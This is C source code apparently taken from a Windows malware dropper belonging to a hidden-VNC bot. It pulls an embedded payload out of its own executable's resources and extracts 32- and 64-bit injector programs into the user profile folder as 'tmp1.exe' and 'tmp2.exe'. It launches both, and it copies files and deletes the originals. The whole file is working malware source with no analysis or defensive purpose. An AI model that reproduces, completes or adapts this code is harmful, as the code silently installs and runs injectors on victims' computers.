#include "includes.h"
#include "dropper.h"
#include "bot\system.h"

#pragma warning(disable:4309)

bool bIsWow64=false;

char szVNC[]="VNC",
     szProfilePathA[MAX_PATH],
     szInj32Exe[MAX_PATH],
     szInj64Exe[MAX_PATH];

_IsWow64Process *fnIsWow64Process;

LPVOID lpDrop;
DWORD dwDropSize;

void StoreFileAtADS(char *lpFrom,char *lpTo)
{
    HANDLE hFromFile=CreateFileA(lpFrom,GENERIC_READ,0,NULL,OPEN_EXISTING,0,NULL);
    if (hFromFile != INVALID_HANDLE_VALUE)
    {
        HANDLE hToFile=CreateFileA(lpTo,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
        if (hToFile != INVALID_HANDLE_VALUE)
        {
            DWORD dwLen=GetFileSize(hFromFile,NULL);
            byte *lpData=(byte*)VirtualAlloc(NULL,dwLen,MEM_COMMIT,PAGE_READWRITE);
            ReadFile(hFromFile,lpData,dwLen,&dwLen,NULL);
            WriteFile(hToFile,lpData,dwLen,&dwLen,NULL);
            VirtualFree(lpData,dwLen,MEM_DECOMMIT);
            SysCloseHandle(hToFile);
        }
        SysCloseHandle(hFromFile);
        DeleteFileA(lpFrom);
    }
    return;
}

void CreateDirectoryTreeA(char *path)
{
    WCHAR *lpPathW=AnsiToUnicodeEx(path,lstrlenA(path));
    CreateDirectoryTree(lpPathW);
    free(lpPathW);
    return;
}

void ReadConfig()
{
    GetUserDirA(szProfilePathA);
    CreateDirectoryTreeA(szProfilePathA);

    HINSTANCE hInstance=LoadLibraryEx(szSelfName,NULL,LOAD_LIBRARY_AS_DATAFILE);
    if (hInstance)
    {
        HRSRC hRsrc=FindResource(hInstance,(LPCWSTR)100,RT_RCDATA);
        if (hRsrc)
        {
            dwDropSize=SizeofResource(hInstance,hRsrc);
            lpDrop=VirtualAlloc(NULL,dwDropSize,MEM_COMMIT,PAGE_READWRITE);
            memcpy(lpDrop,LockResource(LoadResource(hInstance,hRsrc)),dwDropSize);
        }
        FreeLibrary(hInstance);
    }
    return;
}

bool ArchExtractFileTo(HZIP hZip,char *pstrPath,char *lpstrFile,char *lpSaveAs)
{
    bool ret=false;
    if (ArchExtractFileA(hZip,szProfilePathA,lpstrFile))
    {
        char szCurDir[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH,szCurDir);
        SetCurrentDirectoryA(pstrPath);
        if (MoveFileExA(lpstrFile,lpSaveAs,MOVEFILE_REPLACE_EXISTING))
            ret=true;
        else
            DeleteFileA(lpstrFile);
        SetCurrentDirectoryA(szCurDir);
    }
    return ret;
}

void DropOurShit()
{
    HZIP hZip=OpenArch();
    if (hZip)
    {
        char szFormat[]="%s\\%s",szInj32[]="tmp1.exe",szInj64[]="tmp2.exe";

        if (ArchExtractFileTo(hZip,szProfilePathA,inj32,szInj32))
        {
            wsprintfA(szInj32Exe,szFormat,szProfilePathA,szInj32);
            STARTUPINFOA siInfo={0};
            PROCESS_INFORMATION piInfo={0};
            siInfo.cb=sizeof(siInfo);
            CreateProcessA(NULL,szInj32Exe,NULL,NULL,false,0,NULL,NULL,&siInfo,&piInfo);
            SysCloseHandle(piInfo.hThread);
            SysCloseHandle(piInfo.hProcess);
        }
        if ((bIsWow64) && (ArchExtractFileTo(hZip,szProfilePathA,inj64,szInj64)))
        {
            wsprintfA(szInj64Exe,szFormat,szProfilePathA,szInj64);
            STARTUPINFOA siInfo={0};
            PROCESS_INFORMATION piInfo={0};
            siInfo.cb=sizeof(siInfo);
            CreateProcessA(NULL,szInj64Exe,NULL,NULL,false,0,NULL,NULL,&siInfo,&piInfo);
            SysCloseHandle(piInfo.hThread);
            SysCloseHandle(piInfo.hProcess);
        }
        ArchClose(hZip);
    }
    return;
}

bool ExtractOneFile(char *lpFile,char *lpPath)
{
    bool r=false;
    HZIP hZip=OpenArch();
    if (hZip)
    {
        if (ArchExtractFileA(hZip,lpPath,lpFile))
        {
            char szFilePath[MAX_PATH];
            wsprintfA(szFilePath,"%s\\%s",lpPath,lpFile);
            r=true;
        }
        ArchClose(hZip);
    }
    return r;
}
